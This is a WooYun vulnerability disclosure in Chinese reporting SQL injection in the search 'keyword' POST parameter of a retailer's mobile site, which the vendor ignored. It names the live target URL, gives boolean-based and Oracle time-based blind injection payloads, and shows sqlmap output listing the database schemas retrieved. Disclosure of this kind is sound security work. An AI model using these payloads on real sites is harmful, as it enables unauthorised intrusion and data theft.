wybug_title: 红星美凯龙手机端PostSql注入
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-09-29：	细节已通知厂商并且等待厂商处理中									2015-10-13：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 如题 详细说明：  注册之后登陆
http://wap.mmall.com/index.php?r=goods/search
经典搜索框注入Keyword参数存在注入求20Rank   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: keyword (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keyword=1%' AND 1411=1411 AND '%'='    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: keyword=1%' AND 9370=DBMS_PIPE.RECEIVE_MESSAGE(CHR(102)||CHR(86)||HR(65)||CHR(81),5) AND '%'='---[20:44:14] [INFO] the back-end DBMS is Oracleback-end DBMS: Oracle[20:44:14] [WARNING] schema names are going to be used on Oracle for enumeratio as the counterpart to database names on other DBMSes[20:44:14] [INFO] fetching database (schema) names[20:44:14] [INFO] fetching number of databases[20:44:14] [WARNING] running in a single-thread mode. Please consider usage ofption '--threads' for faster data retrieval[20:44:14] [INFO] retrieved: 9[20:44:23] [INFO] retrieved: APPQOSSYS[20:45:48] [INFO] retrieved: DBSNMP[20:46:49] [INFO] retrieved: HMSC[20:47:29] [INFO] retrieved: HMSC_S[20:48:28] [INFO] retrieved: OUTLN[20:49:19] [INFO] retrieved: SYS[20:49:53] [INFO] retrieved: SYSTEM[20:50:51] [INFO] retrieved: UTILITY[20:52:00] [INFO] retrieved: WMSYSavailable databases [9]:[*] APPQOSSYS[*] DBSNMP[*] HMSC[*] HMSC_S[*] OUTLN[*] SYS[*] SYSTEM[*] UTILITY[*] WMSYS
   修复方案：  只要不把搜索框去掉随你们整~   版权声明：转载请注明来源 Rand0m@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-13 06:18 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无
